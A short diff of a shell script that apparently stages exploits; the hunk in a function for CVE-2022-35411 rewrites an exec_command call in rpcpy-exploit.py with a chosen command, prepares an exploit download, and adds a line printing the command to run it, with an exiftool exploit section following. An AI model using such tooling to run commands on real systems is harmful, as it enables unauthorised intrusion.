@@ -768,6 +768,7 @@ perform_cve_2022_35411() {
     sed -E -i "s/exec_command\('.*'\)/exec_command\('$exec_command'\)/g" rpcpy-exploit.py
     popd || exit 1
     generate_exploit_download
+    echo 'python3 rpcpy-exploit.py'
 }
 
 #exiftool exploit
